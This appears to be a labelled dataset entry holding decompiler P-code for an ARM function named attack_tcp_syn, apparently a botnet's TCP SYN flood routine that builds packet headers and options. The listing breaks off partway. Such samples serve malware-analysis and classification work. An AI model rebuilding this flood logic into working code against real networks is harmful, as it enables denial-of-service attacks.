Label: 855
Function: attack_tcp_syn
Architecture: arm
Source File: Unknown
Entry Point: 00016c98

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x100002bf, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x3d, 4)
(unique, 0x100001ba, 4) PTRSUB (unique, 0x100002e7, 4) , (const, 0x0, 4)
(unique, 0x100002e7, 4) PTRSUB (unique, 0x8280, 4) , (const, 0x0, 4)
(register, 0x28, 4) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x100001c2, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffffac, 4) , (const, 0x18, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x100001c2, 4) , (const, 0x10, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x28, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x726, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x726, 4)
(unique, 0x100001ca, 4) PTRSUB (stack, 0xffffffffffffffb8, 4) , (const, 0xc, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x100002eb, 4) , (const, 0x4, 4)
(unique, 0x100002eb, 4) PTRSUB (unique, 0x100001ca, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffe4, 2)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x72c, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x72c, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x72c, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x72c, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x72c, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x72c, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x72c, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x72c, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x72c, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x72c, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x72c, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x72c, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x72c, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x72c, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x72c, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x72c, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x72c, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x72c, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x72c, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x72c, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x72c, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x72c, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x72c, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x100001d2, 4) , (register, 0x20, 2)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x733, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x733, 4)
(unique, 0x100001d2, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffe2, 2)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x739, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x739, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x739, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x739, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x739, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x739, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x739, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x739, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x739, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x739, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x739, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x739, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x739, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x739, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x739, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x739, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x739, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x739, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x739, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x739, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x739, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x739, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x739, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x740, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x740, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x2, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (register, 0x20, 2)
(register, 0x20, 2) SUBPIECE (stack, 0xffffffffffffffdc, 4) , (const, 0x0, 4)
(register, 0x20, 4) INT_ZEXT (register, 0x20, 2)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x759, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x759, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x759, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x759, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x759, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x759, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x759, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x759, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x759, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x759, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x759, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x759, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x759, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x759, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x759, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x759, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x759, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x759, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x759, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x759, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x759, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x759, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x759, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x20, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x75f, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x75f, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x4, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xc, 4)
(register, 0x2c, 1) INT_AND (unique, 0x43980, 1) , (const, 0xaf, 1)
(register, 0x2c, 1) INT_OR (register, 0x2c, 1) , (const, 0xa0, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x2c, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x780, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x780, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xc, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffd7, 1)
(register, 0x2c, 4) INT_AND (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xd, 4)
(unique, 0x1000012e, 1) INT_AND (unique, 0x43980, 1) , (const, 0xdf, 1)
(unique, 0x3580, 4) INT_LEFT (register, 0x2c, 4) , (const, 0x5, 4)
(unique, 0x70d00, 1) INT_OR (unique, 0x1000012d, 1) , (unique, 0x1000012e, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (unique, 0x70d00, 1)
(unique, 0x1000012d, 1) SUBPIECE (unique, 0x3580, 4) , (const, 0x0, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x7cd, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x7cd, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xd, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffd6, 1)
(register, 0x2c, 4) INT_AND (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xd, 4)
(unique, 0x10000132, 1) INT_AND (unique, 0x43980, 1) , (const, 0xef, 1)
(unique, 0x3580, 4) INT_LEFT (register, 0x2c, 4) , (const, 0x4, 4)
(unique, 0x70d00, 1) INT_OR (unique, 0x10000131, 1) , (unique, 0x10000132, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (unique, 0x70d00, 1)
(unique, 0x10000131, 1) SUBPIECE (unique, 0x3580, 4) , (const, 0x0, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x81a, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x81a, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xd, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffd5, 1)
(register, 0x2c, 4) INT_AND (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xd, 4)
(unique, 0x10000136, 1) INT_AND (unique, 0x43980, 1) , (const, 0xf7, 1)
(unique, 0x3580, 4) INT_LEFT (register, 0x2c, 4) , (const, 0x3, 4)
(unique, 0x70d00, 1) INT_OR (unique, 0x10000135, 1) , (unique, 0x10000136, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (unique, 0x70d00, 1)
(unique, 0x10000135, 1) SUBPIECE (unique, 0x3580, 4) , (const, 0x0, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x867, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x867, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xd, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffd4, 1)
(register, 0x2c, 4) INT_AND (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xd, 4)
(unique, 0x1000013a, 1) INT_AND (unique, 0x43980, 1) , (const, 0xfb, 1)
(unique, 0x3580, 4) INT_LEFT (register, 0x2c, 4) , (const, 0x2, 4)
(unique, 0x70d00, 1) INT_OR (unique, 0x10000139, 1) , (unique, 0x1000013a, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (unique, 0x70d00, 1)
(unique, 0x10000139, 1) SUBPIECE (unique, 0x3580, 4) , (const, 0x0, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x8b4, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x8b4, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xd, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffd3, 1)
(register, 0x2c, 4) INT_AND (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xd, 4)
(unique, 0x1000013e, 1) INT_AND (unique, 0x43980, 1) , (const, 0xfd, 1)
(unique, 0x3580, 4) INT_LEFT (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x70d00, 1) INT_OR (unique, 0x1000013d, 1) , (unique, 0x1000013e, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (unique, 0x70d00, 1)
(unique, 0x1000013d, 1) SUBPIECE (unique, 0x3580, 4) , (const, 0x0, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x901, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x901, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xd, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xd, 4)
(register, 0x24, 1) INT_AND (stack, 0xffffffffffffffd2, 1) , (const, 0x1, 1)
(register, 0x2c, 1) INT_AND (unique, 0x43980, 1) , (const, 0xfe, 1)
(register, 0x2c, 1) INT_OR (register, 0x24, 1) , (register, 0x2c, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x2c, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x943, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x943, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xd, 4)
(register, 0x28, 4) PTRADD (stack, 0xffffffffffffffb0, 4) , (const, 0x1, 4) , (const, 0x1, 4)
 ---  STORE (const, 0x1a1, 4) , (stack, 0xffffffffffffffb0, 4) , (const, 0x2, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x962, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x962, 4)
(register, 0x28, 4) PTRADD (stack, 0xffffffffffffffb0, 4) , (const, 0x2, 4) , (const, 0x1, 4)
 ---  STORE (const, 0x1a1, 4) , (register, 0x28, 4) , (const, 0x4, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x981, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x981, 4)
(register, 0x20, 4) CALL (ram, 0x1cb48, 8)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x983, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x983, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x983, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (register, 0x28, 4) , (const, 0x983, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x983, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x983, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x983, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x983, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x983, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x983, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x983, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x983, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x983, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x983, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x983, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x983, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x983, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x983, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x983, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x983, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x983, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x983, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x983, 4)
(register, 0x2c, 4) INT_AND (register, 0x20, 4) , (const, 0xf, 4)
(register, 0x2c, 4) INT_ADD (register, 0x2c, 4) , (const, 0x578, 4)
(unique, 0x3580, 4) INT_MULT (register, 0x2c, 4) , (const, 0x10000, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (register, 0x20, 2)
(register, 0x20, 2) SUBPIECE (unique, 0x1000029f, 4) , (const, 0x0, 4)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x9e7, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x9e7, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x9e7, 4)
(unique, 0x1000029f, 4) INT_RIGHT (unique, 0x3580, 4) , (const, 0x10, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x100002ef, 4) , (register, 0x20, 2)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0x9ee, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0x9ee, 4)
(unique, 0x100002ef, 4) CAST (stack, 0xffffffffffffffb0, 4)
(register, 0x2c, 4) PTRADD (stack, 0xffffffffffffffb0, 4) , (const, 0x2, 4) , (const, 0x1, 4)
(register, 0x28, 4) PTRADD (stack, 0xffffffffffffffb0, 4) , (const, 0x3, 4) , (const, 0x1, 4)
 ---  STORE (const, 0x1a1, 4) , (register, 0x2c, 4) , (const, 0x4, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0xa1d, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0xa1d, 4)
(register, 0x28, 4) PTRADD (stack, 0xffffffffffffffb0, 4) , (const, 0x4, 4) , (const, 0x1, 4)
 ---  STORE (const, 0x1a1, 4) , (register, 0x28, 4) , (const, 0x2, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0xa3c, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0xa3c, 4)
(register, 0x28, 4) PTRADD (stack, 0xffffffffffffffb0, 4) , (const, 0x5, 4) , (const, 0x1, 4)
 ---  STORE (const, 0x1a1, 4) , (register, 0x28, 4) , (const, 0x8, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0xa5b, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0xa5b, 4)
(register, 0x28, 4) PTRADD (stack, 0xffffffffffffffb0, 4) , (const, 0x6, 4) , (const, 0x1, 4)
 ---  STORE (const, 0x1a1, 4) , (register, 0x28, 4) , (const, 0xa, 1)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0xa7a, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0xa7a, 4)
(register, 0x20, 4) CALL (ram, 0x1cb48, 8)
(ram, 0x175d4, 4) INDIRECT (ram, 0x175d4, 4) , (const, 0xa7c, 4)
(ram, 0x175d8, 4) INDIRECT (ram, 0x175d8, 4) , (const, 0xa7c, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0xa7c, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (register, 0x28, 4) , (const, 0xa7c, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0xa7c, 4)
